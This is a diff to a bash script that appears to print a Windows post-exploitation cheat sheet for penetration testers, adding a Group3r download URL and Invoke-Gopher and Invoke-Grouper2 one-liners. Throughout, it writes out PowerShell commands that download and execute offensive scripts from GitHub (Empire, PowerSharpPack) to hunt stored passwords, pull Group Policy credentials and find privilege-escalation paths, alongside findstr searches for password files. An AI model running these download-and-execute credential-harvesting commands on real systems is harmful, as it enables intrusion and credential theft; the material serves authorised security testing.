@@ -51,6 +51,7 @@ BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master
 DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/"
 EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
 GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
+Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r.exe";
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
@@ -461,6 +462,9 @@ echo -e ""
 echo -e "${IBLUE}CMD${RESTORE}"
 echo -e "findstr /si pass *.xml *.doc *.txt *.xls"
 echo -e "findstr /si cred *.xml *.doc *.txt *.xls"
+echo -e ""
+echo -e "${IBLUE}Gopher${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Gopher.ps1);Invoke-Gopher"
 echo -e ""
 echo -e "${IBLUE}PowerShell${RESTORE}"
 echo -e "ls -R | select-string -Pattern 'password'"
@@ -1067,6 +1071,9 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
 echo -e ""
 echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
+echo -e ""
+echo -e "${IBLUE}Grouper2${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Grouper2.ps1);Invoke-Grouper2 -Command "\"-g -f Grouper2-Report.html"\""
 echo -e ""
 echo -e "${IBLUE}Sherlock${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
